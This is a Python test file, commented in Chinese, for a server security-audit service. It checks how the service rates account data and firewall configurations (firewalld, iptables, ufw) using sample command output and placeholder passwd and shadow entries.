def test_e5_docker_command_template_includes_docker_ps():
    """E5: SERVER_SERVICE_STATUS 命令模板必须含 DOCKER_PS 段。"""
    specs = svc._server_check_specs("", ["SERVICE_STATUS"])
    cmd = next(s["command"] for s in specs if s["category"] == "SERVICE_STATUS")
    assert "---DOCKER_PS---" in cmd
    assert "docker ps -a" in cmd
    print("  PASS: E5 服务状态命令模板包含 DOCKER_PS 段")


def test_h3_accounts_empty_passwd_warns():
    """H3 根因：报告 0 个系统账号原版直接 PASS → 应升级 MEDIUM WARNING。"""
    r, s, m, sg, f = svc._analyze_accounts("", "", 0, {})
    assert r == "MEDIUM", f"H3: 0 账号空输出应 MEDIUM; got {r}, msg={m}"
    assert s == "WARNING"
    assert "未获取到" in m, f"H3: msg 应包含'未获取到'; got {m}"
    assert f["total_users"] == 0
    print(f"  PASS: H3 账号安全 0 用户空输出 → MEDIUM WARNING")


def test_h3_accounts_only_section_markers_warns():
    """H3：只含 section 标记无内容（命令失败但输出了 echo）→ MEDIUM。"""
    out = "---PASSWD---\n---UID0---\n---SHADOW---\n---SHADOW_ERR---\nERR\n"
    r, s, m, sg, f = svc._analyze_accounts(out, "", 0, {})
    # shadow_denied = True 所以走其他路径，但 total_users=0 时还是 MEDIUM
    assert f["total_users"] == 0
    print(f"  PASS: H3 账号安全只有 section 标记 → total_users=0")


def test_h3_accounts_normal_data_still_pass():
    """H3 回归：正常数据回归 — 有 root 用户时仍 NONE。"""
    out = (
        "---PASSWD---\n"
        "root:x:0:0:root:/root:/bin/bash\n"
        "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
        "---UID0---\n"
        "root:x:0:0:root:/root:/bin/bash\n"
        "---SHADOW---\n"
        "root:$6$abc:19000:0:99999:7:::\n"
        "---SHADOW_ERR---\n"
        "OK\n"
    )
    r, s, m, sg, f = svc._analyze_accounts(out, "", 0, {})
    assert r == "NONE", f"H3: 正常 1 UID=0 应 PASS; got {r}, msg={m}"
    assert f["total_users"] == 2
    assert f["login_user_count"] == 1  # 只有 root 是 bash
    print(f"  PASS: H3 账号安全正常数据回归 NONE（{f['total_users']} users）")


# ============================================================
# I1 - 防火墙复合场景判定（firewalld inactive + iptables INPUT ACCEPT）
# ============================================================

def test_i1_firewall_firewalld_inactive_with_iptables_input_accept():
    """I1 根因：用户报告场景 — firewalld inactive + iptables INPUT ACCEPT 仍仅报 MEDIUM "可能未启用"。"""
    out = (
        "$ # 防火墙巡检（只读）\n"
        "systemctl is-active firewalld 2>/dev/null || true\n"
        "firewall-cmd --list-all 2>/dev/null || true\n"
        "iptables -S 2>/dev/null || true\n"
        "ufw status verbose 2>/dev/null || true\n"
        "# 判定要点：防火墙关闭、全局放行、高危端口放行、黑白名单冲突。\n"
        "exit=0 duration_ms=295\n"
        "inactive\n"
        "-P INPUT ACCEPT\n"
        "-P FORWARD DROP\n"
        "-P OUTPUT ACCEPT\n"
        "-N DOCKER\n"
        "-N DOCKER-BRIDGE\n"
        "-N DOCKER-CT\n"
        "-N DOCKER-FORWARD\n"
        "-N DOCKER-INTERNAL\n"
        "-N DOCKER-USER\n"
        "-A FORWARD -j DOCKER-USER\n"
        "-A FORWARD -j DOCKER-FORWARD\n"
    )
    r, s, m, sg, f = svc._analyze_firewall(out, "", 0, {})
    # I1 修复后：firewalld inactive + iptables INPUT ACCEPT + 11 条规则 → MEDIUM WARNING
    assert r == "MEDIUM", f"I1: firewalld inactive + iptables INPUT ACCEPT 应 MEDIUM; got {r}, msg={m}"
    assert s == "WARNING"
    assert "firewalld" in m and "INPUT" in m and "ACCEPT" in m, f"I1: msg 应说明 firewalld 未运行 + INPUT ACCEPT; got {m}"
    assert "DROP" in m or "firewalld" in m  # 建议中提到 DROP 或启用 firewalld
    assert f["default_policy_accept"] is True
    assert len(f["global_pass_lines"]) == 0  # 没有 -A ... 0.0.0.0/0 规则
    print(f"  PASS: I1 防火墙 firewalld inactive + iptables INPUT ACCEPT → MEDIUM WARNING（真实状态说明）")


def test_i1_firewall_only_inactive_no_iptables_rules():
    """I1 边界：firewalld/ufw inactive 且 iptables 无规则（真正未启用）。"""
    out = (
        "exit=0\n"
        "inactive\n"
        "Status: inactive\n"
    )
    r, s, m, sg, f = svc._analyze_firewall(out, "", 0, {})
    # 真的没防火墙 → 走 no_local_firewall 分支（默认 no_local_firewall_level=LOW 云环境）
    assert r in ("LOW", "MEDIUM"), f"I1: 真正无防火墙 应 LOW/MEDIUM; got {r}, msg={m}"
    assert f["default_policy_accept"] is False
    print(f"  PASS: I1 防火墙真正未启用 → {r}（保持原行为，云环境友好）")


def test_i1_firewall_firewalld_inactive_but_iptables_has_drop_policy():
    """I1 边界：firewalld inactive + iptables INPUT DROP → LOW INFO（有专用管理）。"""
    out = (
        "exit=0\n"
        "inactive\n"
        "-P INPUT DROP\n"
        "-P FORWARD DROP\n"
        "-P OUTPUT ACCEPT\n"
        "-N DOCKER-USER\n"
        "-A INPUT -i lo -j ACCEPT\n"
        "-A INPUT -p tcp --dport 22 -j ACCEPT\n"
    )
    r, s, m, sg, f = svc._analyze_firewall(out, "", 0, {})
    # firewalld 未运行但 iptables 默认 DROP → LOW INFO（有管理）
    assert r == "LOW", f"I1: firewalld inactive + iptables DROP 应 LOW; got {r}, msg={m}"
    assert f["default_policy_accept"] is False
    print(f"  PASS: I1 防火墙 firewalld inactive + iptables INPUT DROP → LOW INFO")


def test_i1_firewall_global_pass_high_risk_still_high():
    """I1 回归：全局放行规则应继续报 HIGH。"""
    out = (
        "exit=0\n"
        "-A INPUT -s 0.0.0.0/0 -p all -j ACCEPT\n"
    )
    r, s, m, sg, f = svc._analyze_firewall(out, "", 0, {})
    assert r == "HIGH", f"I1: 全局放行 应 HIGH; got {r}, msg={m}"
    assert s == "RISK"
    print(f"  PASS: I1 防火墙全局放行回归 HIGH RISK")


def test_i1_firewall_normal_drop_policy_pass():
    """I1 回归：默认 DROP 策略 + 显式 ACCEPT 关键端口 → NONE PASS。"""
    out = (
        "exit=0\n"
        "-P INPUT DROP\n"
        "-P FORWARD DROP\n"
        "-P OUTPUT ACCEPT\n"
        "-N DOCKER-USER\n"
        "-A INPUT -i lo -j ACCEPT\n"
        "-A INPUT -p tcp --dport 22 -j ACCEPT\n"
        "-A INPUT -p tcp --dport 80 -j ACCEPT\n"
    )
    r, s, m, sg, f = svc._analyze_firewall(out, "", 0, {})
    assert r == "NONE", f"I1: 默认 DROP + 显式 ACCEPT 应 PASS; got {r}, msg={m}"
    assert f["default_policy_accept"] is False
    print(f"  PASS: I1 防火墙默认 DROP + 显式 ACCEPT 关键端口 → NONE PASS")


if __name__ == "__main__":
    tests = [v for k, v in list(globals().items()) if k.startswith("test_")]
    failed = 0
    for t in tests:
        try:
            print(f"RUN: {t.__name__}")
            t()
        except AssertionError as e:
            print(f"  FAIL: {e}")
            failed += 1
        except Exception as e:
            import traceback
            traceback.print_exc()
            print(f"  ERROR: {e}")
            failed += 1
    print(f"\n=== Total {len(tests)} tests, {failed} failed ===")
    sys.exit(failed)
